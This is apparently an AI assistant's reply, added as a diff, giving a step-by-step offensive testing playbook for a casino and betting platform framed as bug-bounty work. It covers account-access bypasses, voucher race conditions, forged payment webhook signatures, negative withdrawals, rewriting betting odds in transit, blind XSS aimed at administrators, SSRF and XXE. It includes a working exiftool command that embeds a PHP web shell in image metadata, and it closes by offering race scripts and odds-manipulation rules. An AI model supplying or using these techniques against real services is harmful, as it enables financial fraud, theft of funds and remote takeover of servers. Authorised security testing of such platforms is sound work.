@@ -1,0 +1,81 @@
+Here are the industry-standard tools that map directly to each testing step, configured to respect the program’s strict limits.
+------------------------------
+## Area 1: Authentication & Account Management## Step 1: Mapping & Parameter Discovery
+
+* Tool: Burp Suite Professional / Community Edition (Proxy & Comparer)
+* Implementation: Route your browser traffic through Burp. Right-click the registration and login requests from your HTTP history, select Send to Comparer, and choose Compare words to instantly highlight differing parameters like IDs or security tokens.
+
+## Step 2: Testing for IDOR & BOLA
+
+* Tool: Burp Suite Extension: Autorize or Match and Replace
+* Implementation: Install Autorize from the BApp Store. Feed it the cookies/headers of Account B. As you browse the platform normally using Account A, Autorize automatically repeats the requests with Account B's authorization context, highlighting unauthorized responses in green or yellow.
+
+## Step 3: Testing Authentication Bypass & Logic Flaws
+
+* Tool: Burp Suite Proxy (Response Interception)
+* Implementation: In Burp, navigate to Proxy -> Options and check Intercept responses based on the following rules. When submitting bad credentials, click Action -> Intercept response to this request to stop the server’s output and rewrite the status flags before it reaches your browser.
+
+## Step 4: Race Conditions on Voucher/Promo Code Verification
+
+* Tool: Burp Suite Extension: Turbo Intruder
+* Implementation: Send the voucher submission request to Turbo Intruder. Use a tailored race script deploying the concurrentRequestGate() mechanism. Set the engine parameters to fire exactly 5 requests concurrently to stay within the exact limit of the program rules.
+
+------------------------------
+## Area 2: Financial Operations (Deposits, Withdrawals, & Payments)## Step 1: Parameter Tampering on Initiated Deposits
+
+* Tool: Burp Suite Intercept or OWASP ZAP (Breakpoints)
+* Implementation: Turn Intercept is On in Burp right before clicking the final deposit checkout button. Modify the parameters directly inside the raw HTTP request window before hitting Forward.
+
+## Step 2: Callback/Webhook Impersonation
+
+* Tool: CyberChef paired with Burp Suite Repeater
+* Implementation: Use CyberChef (an online/offline data manipulation tool) to test cryptographic vulnerabilities. If the payment signatures rely on weak hashing combinations, use CyberChef’s Hash or HMAC blocks to generate fake signatures, then paste them into Burp Repeater to replay the webhooks.
+
+## Step 3: Manipulating Withdrawal Requests
+
+* Tool: Burp Suite Repeater
+* Implementation: Send the successful withdrawal API request to Repeater. Manually alter the amount fields to negative values or alternate formats. Use the Send button repeatedly or create a small tab group to monitor the behavioral patterns of the payment endpoint.
+
+------------------------------
+## Area 3: Casino & Betting Core Features## Step 1: WebSocket and HTTP Traffic Interception
+
+* Tool: Burp Suite (WebSockets History Tab) or Whidi (WebSocket fuzzer)
+* Implementation: Do not look at standard HTTP history. In Burp, switch to the WebSockets history tab while spinning casino slots or placing wagers to view real-time, binary, or text-based state packets streaming back and forth.
+
+## Step 2: Game State & Odds Tampering
+
+* Tool: Burp Suite Extension: Match and Replace
+* Implementation: Go to Proxy -> Settings -> Match and Replace. Create a rule that dynamically targets the outgoing WebSocket or HTTP packet string (e.g., Match: odds=1.5 -> Replace: odds=15.0). This automates real-time parameter alteration before the packet leaves your machine.
+
+## Step 3: Stored and Admin-Targeted Blind XSS
+
+* Tool: XSS Hunter or Burp Suite Collaborator
+* Implementation: Generate a unique monitoring payload via XSS Hunter or the Burp Collaborator client. Paste the generated payload URL inside input boxes. If an internal company administrator opens a support ticket or client profile containing your input, your testing panel will record the interaction.
+
+------------------------------
+## Area 4: Infrastructure & Input Handling (Platform-Wide)## Step 1: Testing Server-Side Request Forgery (SSRF)
+
+* Tool: Interactsh (by ProjectDiscovery) or Burp Collaborator
+* Implementation: Instead of using your own server, use interactsh-client to generate an out-of-band testing domain. Input this domain into target file-fetching features to check if the platform infrastructure reaches out to the payload destination.
+
+## Step 2: Testing Document Uploads (XXE & LFR)
+
+* Tool: Visual Studio Code / Neovim paired with CyberChef
+* Implementation: Open a local IDE to cleanly format raw XML payloads. Paste the crafted XML structure into a file. Use CyberChef to base64 encode or compress payloads if they need to be embedded inside clean templates like valid .docx or .xlsx files.
+
+## Step 3: Remote Code Execution (RCE) via File Validation Bypass
+
+* Tool: Exiftool paired with Burp Suite Proxy
+* Implementation: Use Exiftool via your local terminal command line to embed hidden web shell snippets inside the metadata fields of an image file:
+
+exiftool -Comment="<?php system($_GET['cmd']); ?>" valid_avatar.png
+
+Upload this file and use Burp to alter the extension headers on the fly.
+
+------------------------------
+If you want to configure one of these setups now, let me know:
+
+* Would you like the exact Turbo Intruder Python script for the race condition testing?
+* Do you need help setting up Match and Replace rules for betting traffic manipulation?
+
+
